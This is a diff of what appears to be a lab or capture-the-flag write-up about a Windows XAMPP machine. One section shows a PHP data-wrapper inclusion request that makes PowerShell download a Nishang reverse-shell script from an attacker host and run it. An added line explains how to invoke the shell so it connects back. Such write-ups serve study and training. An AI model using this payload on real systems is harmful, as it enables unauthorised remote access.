@@ -41,7 +41,7 @@ PORT     STATE SERVICE VERSION
 ```
 {{< /collapse >}}
 
-Windows box running XAMPP on two ports. FTP requires credentials, MySQL is localhost-only.
+Windows box running XAMPP on two HTTP ports (4443 and 8080); the vulnerable app lives on 8080, so 4443 stays untouched. FTP requires credentials, MySQL is localhost-only.
 
 ### Port 8080 - XAMPP Web App
 
@@ -70,6 +70,8 @@ For a proper shell, use the wrapper to download and execute a Nishang reverse sh
 ```
 GET /site/index.php?page=data:text/plain,<?php+echo+shell_exec("powershell.exe+-nop+-exec+bypass+IEX+(IWR+http%3a//192.168.49.105/Invoke-PowerShellTcp.ps1+-UseBasicParsing)")+?> HTTP/1.1
 ```
+
+`IEX` only loads the function, so append the invocation (`Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.105 -Port <listener>`) to the bottom of the served `Invoke-PowerShellTcp.ps1` before hosting it.
 
 Shell as `rupert` -- unprivileged user with no interesting permissions.
 
